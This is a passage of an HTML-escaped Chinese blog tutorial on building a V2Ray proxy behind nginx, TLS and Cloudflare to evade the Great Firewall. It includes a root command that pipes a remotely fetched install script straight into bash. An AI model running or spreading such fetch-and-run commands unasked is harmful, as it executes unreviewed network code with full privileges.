      &lt;li&gt;&lt;a href=&quot;#31-整体方案&quot; id=&quot;markdown-toc-31-整体方案&quot;&gt;3.1 整体方案&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-安装nginx&quot; id=&quot;markdown-toc-32-安装nginx&quot;&gt;3.2 安装nginx&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#33-域名解析&quot; id=&quot;markdown-toc-33-域名解析&quot;&gt;3.3 域名解析&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#34-安全证书&quot; id=&quot;markdown-toc-34-安全证书&quot;&gt;3.4 安全证书&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#35-隐藏地址&quot; id=&quot;markdown-toc-35-隐藏地址&quot;&gt;3.5 隐藏地址&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#36-配置v2ray&quot; id=&quot;markdown-toc-36-配置v2ray&quot;&gt;3.6 配置v2ray&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#37-代理转发&quot; id=&quot;markdown-toc-37-代理转发&quot;&gt;3.7 代理转发&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#38-配置连接&quot; id=&quot;markdown-toc-38-配置连接&quot;&gt;3.8 配置连接&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#完整的配置&quot; id=&quot;markdown-toc-完整的配置&quot;&gt;完整的配置&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-介绍&quot;&gt;1. 介绍&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;//www.v2ray.com/&quot;&gt;V2Ray&lt;/a&gt; 是一个与 Shadowsocks 类似的代理软件，很多人可能会想当然地将 V2Ray 看作一个特定的翻墙协议或用于实现该协议的翻墙软件。但实际上是一个融合了各种翻墙协议的集成性软件，其中只有 VMess 协议是 V2Ray 社区原创的翻墙协议。&lt;/p&gt;

&lt;h2 id=&quot;2-安装和使用&quot;&gt;2. 安装和使用&lt;/h2&gt;

&lt;h3 id=&quot;21-创建实例&quot;&gt;2.1 创建实例&lt;/h3&gt;

&lt;p&gt;参考 &lt;a href=&quot;//wangjun.dev/2019/06/ssr-build/&quot;&gt;旅行必备 ShadowsocketR 搭建与使用&lt;/a&gt; 中的创建实例&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;唯一区别就是建议将CPU设置为”n1标准型”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;22-执行安装&quot;&gt;2.2 执行安装&lt;/h3&gt;

&lt;p&gt;打开 vm 实例的 ssh 终端，输入以下命令执行安装：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 切换成root用户&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 同步本地时间&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/zoneinfo/Asia/Shanghai /etc/localtime

&lt;span class=&quot;c&quot;&gt;# 执行一键安装脚本&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; https://install.direct/go.sh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;终端显示”V2Ray v4.19.1 is installed.”，表示已经安装完成。&lt;/p&gt;

&lt;h3 id=&quot;23-配置文件&quot;&gt;2.3 配置文件&lt;/h3&gt;

&lt;p&gt;点击下载 &lt;a href=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/config.json&quot;&gt;config.json&lt;/a&gt; 配置文件，修改 port、id、alterId 字段，id和alterId随意变更，保持位数一致。port 最好使用已经配置好防火墙规则的端口（关于配置防火墙规则请参看 &lt;a href=&quot;//wangjun.dev/2019/06/ssr-build/&quot;&gt;旅行必备 ShadowsocketR 搭建与使用&lt;/a&gt; 中的配置防火墙一节）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x397?text=&amp;quot;&amp;quot;&quot; alt=&quot;v2ray-config-json&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/v2ray-config-json.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;准备好 v2ray 的配置内容后，到刚才创建的实例中，使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/v2ray/config.json&lt;/code&gt;打开v2ray的配置文件，删除里面全部内容，将准备好的配置明细复制进去，复制的格式很乱，不需要关心，v2ray会正常解析&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;小技巧，vi编辑器中使用命令 :set paste 打开粘贴模式可以保证格式&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;24-重启服务&quot;&gt;2.4 重启服务&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 重新启动v2ray服务&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl restart v2ray

&lt;span class=&quot;c&quot;&gt;# 查询启动后服务状态&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status v2ray

&lt;span class=&quot;c&quot;&gt;# 将v2ray服务注册为开机自自动&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;v2ray
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;25-配置连接&quot;&gt;2.5 配置连接&lt;/h3&gt;

&lt;p&gt;点击下载 &lt;a href=&quot;//github.com/Cenmrev/V2RayX/releases&quot;&gt;v2ray&lt;/a&gt; 客户端并安装。&lt;/p&gt;

&lt;p&gt;所有配置在上面的json中都可以找到，配置如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x549?text=&amp;quot;&amp;quot;&quot; alt=&quot;v2ray-client&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/v2ray-client.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;配置完成并save后，点击load core即可开启国际旅行&lt;/p&gt;

&lt;h2 id=&quot;3-欺骗与伪装&quot;&gt;3. 欺骗与伪装&lt;/h2&gt;

&lt;p&gt;上面的配置方式是直连 v2ray 服务端，虽然使用的是 vmes 协议这种冷门协议，尽管也对传输体进行了aes的加密，但不排除伟大的墙会找到协议的特征码进行block，为了达到极致效果，基于上述继续我们的升级计划。&lt;/p&gt;

&lt;h3 id=&quot;31-整体方案&quot;&gt;3.1 整体方案&lt;/h3&gt;

&lt;p&gt;[v2ray + websocket + tls + nginx + cdn]&lt;/p&gt;

&lt;p&gt;此处应有图，懒的画了，自己理解。&lt;/p&gt;

&lt;h3 id=&quot;32-安装nginx&quot;&gt;3.2 安装nginx&lt;/h3&gt;

&lt;p&gt;继续在上面的服务器中执行以下命令安装nginx反向代理服务器（这也是为什么在第一步要求CPU稍微高点的原因，毕竟需要安装两个服务，不能使用微型CPU配置）&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 切换成root用户&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 安装nginx服务&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nginx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;安装完成后，默认nginx就已经启动，可以使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -an | grep 80&lt;/code&gt;看看端口是否处于 listen 状态，打开浏览器，直接输入服务器的IP地址应该可以看到nginx的欢迎界面，如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x454?text=&amp;quot;&amp;quot;&quot; alt=&quot;nginx&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/nginx.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;33-域名解析&quot;&gt;3.3 域名解析&lt;/h3&gt;

&lt;p&gt;这里使用在阿里云注册的域名为例，如果没有的话，可以在 &lt;a href=&quot;https://www.freenom.com/zh/index.html?lang=zh&quot;&gt;freenom&lt;/a&gt; 可以申请免费域名。将域名解析到上面服务器的公网IP上，添加一个记录，记录类型为A，主机记录为ray，这样就将二级域名 ray.wangjun.bid 解析到了对应的 Google 云服务器上。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x366?text=&amp;quot;&amp;quot;&quot; alt=&quot;aliyun-parse&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/aliyun-parse.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到服务器上使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/nginx/sites-available/default&lt;/code&gt;打开nginx配置文件，删除里面所有内容，将域名配置到nginx的配置文件中，最终内容如下：&lt;/p&gt;

&lt;div class=&quot;language-conf highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; {
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_server&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; [::]:&lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_server&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;htm&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;debian&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;

    &lt;span class=&quot;c&quot;&gt;# 这里使用自己定义的域名
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;server_name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; / {
        &lt;span class=&quot;n&quot;&gt;try_files&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;/ =&lt;span class=&quot;m&quot;&gt;404&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;保存配置，并在终端中使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;nginx -s reload&lt;/code&gt;让nginx重新加载配置，若没有任何信息输出表示配置正确，重新打开浏览器使用域名访问应能正常显示nginx的欢迎页面，说明域名解析成功。&lt;/p&gt;

&lt;h3 id=&quot;34-安全证书&quot;&gt;3.4 安全证书&lt;/h3&gt;

&lt;p&gt;上面的输出说明我们正常解析了域名，但80端口的HTTP协议是明文传输的，我们需要在HTTP协议上层在加上TLS的HTTPS协议，使传输内容加密。&lt;/p&gt;

&lt;p&gt;要为站点申请HTTPs证书，可以使用 &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;letsencrypt&lt;/a&gt; 机构颁发的免费证书，省钱又可靠，letsencrypt 有个工具 &lt;a href=&quot;https://certbot.eff.org&quot;&gt;certbot&lt;/a&gt;，全自动生成证书，下面是使用方法。&lt;/p&gt;

&lt;p&gt;系统版本和代理服务器安装方式不一样，根据自己的配置来，这里在 Google 云创建的是 debian9 的操作系统，代理服务器使用的是 nginx，所以：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x454?text=&amp;quot;&amp;quot;&quot; alt=&quot;certboot&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/certboot.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那我们的安装方式就是：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 切换成root用户&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 安装certbot及其依赖&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;certbot python-certbot-nginx &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; stretch-backports
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;颁发证书&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certbot &lt;span class=&quot;nt&quot;&gt;--nginx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里会要求输入和选择几项配置，具体如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x735?text=&amp;quot;&amp;quot;&quot; alt=&quot;publish-cert&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/publish-cert.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;出现”Congratulations”说明命令执行成功，重新打开浏览器输入&lt;strong&gt;https://域名&lt;/strong&gt;可以正常看见nginx欢迎界面，且浏览器网址左边的小锁正常显示，HTTPS配置完成。&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;letsencrypt 为我们颁发的HTTPs证书有效期是90天，90天后证书会失效，可以使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;certbot renew --dry-run&lt;/code&gt;重新颁发一次，当然最好在cron中配置好定时任务来自动执行&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;35-隐藏地址&quot;&gt;3.5 隐藏地址&lt;/h3&gt;

&lt;p&gt;Ping域名可以得到真实的服务器地址，尽管可以禁ping命令，但仍有很多工具可以发现我们在 Google 云上真实的服务器IP，这里使用CDN让域名指向地址变得隐藏，尽管这不是绝对的，但仍能杜绝大部分想获取服务器IP的方法。&lt;/p&gt;

&lt;p&gt;CDN同样我们选择免费的，免费即王道，这里选择 &lt;a href=&quot;https://www.cloudflare.com/zh-cn/&quot;&gt;CloudFlare&lt;/a&gt;，具体操作如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x440?text=&amp;quot;&amp;quot;&quot; alt=&quot;CloudFlare-addsite&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-addsite.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x440?text=&amp;quot;&amp;quot;&quot; alt=&quot;CloudFlare-freeplan&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-freeplan.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x440?text=&amp;quot;&amp;quot;&quot; alt=&quot;CloudFlare-parse&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-parse.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x440?text=&amp;quot;&amp;quot;&quot; alt=&quot;CloudFlare-dns&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-dns.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经过上面的操作，CloudFlare配置已经完成，最后在阿里云域名下将对应域名的 DNS 解析为 CloudFlare 为我们分配的 DNS 记录，点击确定即可&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x356?text=&amp;quot;&amp;quot;&quot; alt=&quot;aliyun-edit-dns&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/aliyun-edit-dns.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CDN已经配置完成&lt;/p&gt;

&lt;h3 id=&quot;36-配置v2ray&quot;&gt;3.6 配置v2ray&lt;/h3&gt;

&lt;p&gt;我们上面的操作都与v2ray没有任何关系，只是创建了一个普通的HTTPS的静态站点，现在我们这才开始将其关联。&lt;/p&gt;

&lt;p&gt;编辑&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/v2ray/config.json&lt;/code&gt;文件修改和新增如下配置&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x611?text=&amp;quot;&amp;quot;&quot; alt=&quot;v2ray-config-update&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/v2ray-config-update.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里为什么改端口，之前的端口已经配置在防火墙的出入站规则中，外部是可以直接访问，反向代理一个重要的原则是隐藏内部应用，统一出入口，所以端口只需要设置一个不在防火墙规则里的1024～65535之间的值即可。&lt;/p&gt;

&lt;p&gt;重新启动v2ray并查看启动状态&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl restart v2ray
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status v2ray
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一切正常，恭喜你，你已经不能使用 v2ray 服务了，因为目前 v2ray 服务只是在服务器内部启动，并没有对外开放，只能服务器内部访问，如果暴露 v2ray 服务，这是下一步做的事情。&lt;/p&gt;

&lt;h3 id=&quot;37-代理转发&quot;&gt;3.7 代理转发&lt;/h3&gt;

&lt;p&gt;编辑nginx配置文件&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/nginx/sites-available/default&lt;/code&gt;，内容有些乱，是因为在使用certbot生成HTTPS证书时自动改的，不管，直接使用复制下面在nginx的配置，配置v2ray的反向代理，最终结果如下：&lt;/p&gt;

&lt;div class=&quot;language-conf highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; {
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; [::]:&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipv6only&lt;/span&gt;=&lt;span class=&quot;n&quot;&gt;on&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;;

    &lt;span class=&quot;c&quot;&gt;# 这里填写自己的证书路径
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ssl_certificate&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;live&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;fullchain&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;ssl_certificate_key&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;live&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;privkey&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;
    
    &lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;ssl_dhparam&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;dhparams&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;htm&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;debian&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;

    &lt;span class=&quot;c&quot;&gt;# 这里填写自己的域名
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;server_name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; / {
        &lt;span class=&quot;n&quot;&gt;try_files&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;/ =&lt;span class=&quot;m&quot;&gt;404&lt;/span&gt;;
    }

    &lt;span class=&quot;c&quot;&gt;# ========== 增加的配置 ========== 
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# 请求&quot;/ray&quot;与v2ray配置里的wsSettings下path对齐
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt; {            
        &lt;span class=&quot;c&quot;&gt;# 转发地址与v2ray配置里的listen和port对齐
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;proxy_pass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;://&lt;span class=&quot;m&quot;&gt;127&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;:&lt;span class=&quot;m&quot;&gt;9001&lt;/span&gt;;

        &lt;span class=&quot;n&quot;&gt;proxy_redirect&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_http_version&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Upgrade&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;http_upgrade&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;upgrade&quot;&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;http_host&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行命令让nginx重新加载配置文件，没输出表示配置OK&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ngins &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; reload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解释下上面的配置，当使用”https://域名/ray”访问时，nginx将所有请求代理转发到内部应用127.0.0.1:9001上，而这个启动着9001端口的内部应用就是v2ray服务，这样就像正常访问普通站点一样完成我们伟大的出国旅行计划，出关被检查时，GF认为请求的是正常的网页服务从而达到伪装的目的，下面配置v2ray客户端。&lt;/p&gt;

&lt;h3 id=&quot;38-配置连接&quot;&gt;3.8 配置连接&lt;/h3&gt;

&lt;p&gt;使用伪装欺骗的方式旅行，客户端上的配置与普通的稍有区别，具体如下：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;更改Address和端口号，network协议改成ws，其他保持不变，然后点击transport settings按钮&lt;/li&gt;
  &lt;li&gt;path值改为/ray&lt;/li&gt;
  &lt;li&gt;勾选Use TLS，TLS serverName使用配置的域名&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/599x549?text=&amp;quot;&amp;quot;&quot; alt=&quot;v2ray-client-fake-1&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/v2ray-client-fake-1.png&quot; /&gt;
&lt;img src=&quot;//via.placeholder.com/599x549?text=&amp;quot;&amp;quot;&quot; alt=&quot;v2ray-client-fake-2&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/v2ray-client-fake-2.png&quot; /&gt;
&lt;img src=&quot;//via.placeholder.com/599x549?text=&amp;quot;&amp;quot;&quot; alt=&quot;v2ray-client-fake-3&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/v2ray-client-fake-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;All done.&lt;/strong&gt; 点击客户端上的load core，✈️ 开启你的环游世界之旅。&lt;/p&gt;

&lt;h2 id=&quot;完整的配置&quot;&gt;完整的配置&lt;/h2&gt;

&lt;p&gt;最后奉上v2ray和nginx完整的配置文件，仅供参考。&lt;/p&gt;
&lt;ul&gt;
